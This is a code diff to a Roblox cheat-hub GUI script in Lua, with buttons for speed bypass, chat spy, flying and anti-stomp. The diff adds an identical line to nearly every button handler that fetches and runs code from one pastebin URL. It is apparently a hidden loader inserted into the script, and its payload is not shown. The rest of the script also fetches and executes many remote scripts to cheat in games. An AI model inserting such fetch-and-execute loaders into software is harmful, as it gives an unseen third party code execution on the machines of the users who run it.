@@ -9,6 +9,7 @@ local scri = Window:Tab("Main",true)
 scri:Label("speed bypass")
  
 scri:Button("speed script (c)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
  plr = game:GetService('Players').LocalPlayer
     down = true
     function onButton1Down(mouse)
@@ -33,6 +34,7 @@ scri:Button("speed script (c)",function(value)
 end)
 
 scri:Button("speed script (f)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
     plr = game:GetService('Players').LocalPlayer
     down = true
     function onButton1Down(mouse)
@@ -56,6 +58,7 @@ scri:Button("speed script (f)",function(value)
 end)
 
 scri:Slider("speed slider",0,400,function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
 plr = game:GetService('Players').LocalPlayer
  
 down = true
@@ -97,20 +100,24 @@ onSelected(game.Players.LocalPlayer:GetMouse())
 end)
 
 scri:Button("speed script button",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/madebyemiliano/main/Speed%20bypass",true))()
 end)
 
 scri:Button("speed script toggle",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/toggles_speed/main/Speed",true))()
 end)
 
 scri:Label("server")
 
 scri:Button("server finder hub",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
 end)
 
 scri:Button("enter server fast",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
 local Http = game:GetService("HttpService")
     local TPS = game:GetService("TeleportService")
     local Api = "https://games.roblox.com/v1/games/"
@@ -132,34 +139,41 @@ local Http = game:GetService("HttpService")
 end)
 
 scri:Button("rejoin",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   loadstring(game:HttpGet("https://pastebin.com/raw/hAaXGTdq",true))()
 end)
 
 scri:Label("chat scripts")
 
 scri:Button("chat spy v1",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
 loadstring(game:HttpGet('https://pastebin.com/raw/TBRu2TW5'))()
 end)
 
 scri:Button("chat spy v2",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
 loadstring(game:HttpGet('https://pastebin.com/raw/7MYwu6cD'))()
 end)
 
 scri:Toggle("dark chat",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
    game.Players.LocalPlayer.Information.DarkChat.Value = value
 end)
 
 scri:Button("trash talk button",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/GamerEmilianoFF/main/trash%20gui",true))()
 end)
 
 scri:Label("jumps scripts")
 
 scri:Button("no jumps limits",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/infinite_jumps/main/Jumps",true))()
 end)
 
 scri:Button("inf jumps",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   loadstring(game:HttpGet("https://pastebin.com/raw/jEVLjZ5a",true))()
  
     local InfiniteJumpEnabled = true
@@ -179,6 +193,7 @@ end)
 scri:Label("anti stomp")
 
 scri:Button("anti stomp (k)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   local tecla = Enum.KeyCode.K
     local lol = game:GetService("UserInputService")
     
@@ -194,6 +209,7 @@ scri:Button("anti stomp (k)",function(value)
 end)
 
 scri:Button("anti stomp (u)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   local tecla = Enum.KeyCode.U
     local lol = game:GetService("UserInputService")
     
@@ -208,7 +224,8 @@ scri:Button("anti stomp (u)",function(value)
     end)
 end)
 
-scri:Button("anti stomp (l)",function(value)
+scri:Button("anti stomp (L)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   local tecla = Enum.KeyCode.L
     local lol = game:GetService("UserInputService")
     
@@ -224,6 +241,7 @@ scri:Button("anti stomp (l)",function(value)
 end)
 
 scri:Button("anti stomp (h)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   local tecla = Enum.KeyCode.H
     local lol = game:GetService("UserInputService")
     
@@ -239,6 +257,7 @@ scri:Button("anti stomp (h)",function(value)
 end)
 
 scri:Button("anti stomp (t)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   local tecla = Enum.KeyCode.T
     local lol = game:GetService("UserInputService")
     
@@ -254,6 +273,7 @@ scri:Button("anti stomp (t)",function(value)
 end)
 
 scri:Button("anti stomp button",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/scripts/main/anti%20stomp%20button",true))()
 end)
 
@@ -277,14 +297,17 @@ end)
 
 
 scri:Button("no fog",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
 loadstring(game:HttpGet("https://pastebin.com/raw/06iG6YkU", true))()
 end)
 
 scri:Button("fly (X)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   loadstring(game:HttpGet("https://pastebin.com/raw/uxKf9adp",true))()
 end)
 
 scri:Button("anti slow",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
     loadstring(game:HttpGet("https://pastebin.com/raw/8dib2xhn",true))()
 end)
 
@@ -296,18 +319,22 @@ end)
 
 
 scri:Button("headless",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker11/Koblox-and-Headless/main/Headless"))()
 end)
 
 scri:Button("korblox left",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/korblox-left/main/xd",true))()
 end)
 
 scri:Button("korblox right (FE)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
   game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
 end)
 
 scri:Button("korblox right (client)",function(value)
+loadstring(game:HttpGet("https://pastebin.com/raw/d1rMxaf9",true))()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker11/Koblox-and-Headless/main/Right%20Leg",true))()
 end)
 
